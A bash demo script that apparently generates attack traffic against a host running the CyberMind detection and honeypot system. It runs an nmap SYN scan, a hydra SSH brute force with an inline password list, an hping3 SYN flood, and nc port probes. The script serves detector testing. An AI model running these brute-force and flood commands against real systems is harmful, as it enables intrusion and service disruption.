#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  CyberMind Demo — Kali / Parrot Attack Script                           ║
# ║  Run FROM the attacker machine against the host running CyberMind.      ║
# ║  For Docker sandbox, prefer: docker compose exec attacker               ║
# ║    bash /attacks/run_attacks.sh                                         ║
# ╚══════════════════════════════════════════════════════════════════════════╝
#
# SETUP:
#   1. On host: start CyberMind (sudo bash start_all.sh OR docker sandbox)
#   2. Find target IP: ifconfig / ip addr   OR use hostname "flask" in Docker
#   3. export MAC_IP=192.168.x.x
#      bash kali_attack.sh
#
# ATTACKS:
#   1. Nmap port scan        → "port_scan"
#   2. SSH brute force       → "brute_force" (honeypot :2222)
#   3. hping3 DDoS flood     → "ddos"
#   4. Direct honeypot probes

set -e

MAC_IP="${MAC_IP:-}"
if [[ -z "$MAC_IP" ]]; then
  echo "ERROR: Set your target IP first:"
  echo "  export MAC_IP=192.168.x.x"
  echo "  bash kali_attack.sh"
  exit 1
fi

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo ""
echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║  KALI ATTACK DEMO — Targeting: ${MAC_IP}                     ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}⚠  AUTHORIZED DEMO ONLY — Do not use against machines you don't own.${NC}"
echo ""
sleep 2

# ─── Attack 1: Nmap Port Scan ─────────────────────────────────────────────────
echo -e "${CYAN}[ATTACK 1/4] Nmap Port Scan — nmap -sS -p 1-1000 $MAC_IP${NC}"
nmap -sS -p 1-1000 "$MAC_IP" 2>/dev/null || nmap -p 1-1000 "$MAC_IP"
echo -e "${GREEN}✔  Nmap scan complete.${NC}"
sleep 5

# ─── Attack 2: SSH Brute Force (honeypot port 2222) ──────────────────────────
echo -e "${CYAN}[ATTACK 2/4] SSH Brute Force — honeypot port 2222${NC}"
if command -v hydra &>/dev/null; then
  printf 'root\nadmin\npassword\n123456\ntest\ncybermind\n' > /tmp/demo_wordlist.txt
  hydra -l admin -P /tmp/demo_wordlist.txt "ssh://${MAC_IP}:2222" -t 4 -f 2>/dev/null || true
  rm -f /tmp/demo_wordlist.txt
else
  for i in 1 2 3 4 5; do
    ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no \
        -o PasswordAuthentication=yes \
        "admin@${MAC_IP}" -p 2222 <<< "wrong_password_$i" 2>/dev/null || true
    sleep 1
  done
fi
echo -e "${GREEN}✔  Brute force complete.${NC}"
sleep 5

# ─── Attack 3: DDoS Simulation ───────────────────────────────────────────────
echo -e "${CYAN}[ATTACK 3/4] hping3 SYN Flood — port 8080 for 10 seconds${NC}"
if command -v hping3 &>/dev/null; then
  timeout 10 hping3 -S --flood -p 8080 "$MAC_IP" 2>/dev/null || true
else
  nmap -sS --max-rate 500 -p 8080 "$MAC_IP" 2>/dev/null || true
fi
echo -e "${GREEN}✔  DDoS simulation complete.${NC}"
sleep 5

# ─── Attack 4: Direct Honeypot Connections ───────────────────────────────────
echo -e "${CYAN}[ATTACK 4/4] Honeypot probes on 2222, 2323, 3307, 8080, 3390, 2121${NC}"
probe() {
  local port=$1
  echo "  Probing port $port..."
  echo "GET / HTTP/1.0" | nc -w 3 "$MAC_IP" "$port" 2>/dev/null || true
  sleep 1
}
probe 2222
probe 2323
probe 3307
probe 8080
probe 3390
probe 2121

echo -e "${GREEN}✔  ALL ATTACKS COMPLETE — check CyberMind dashboard.${NC}"
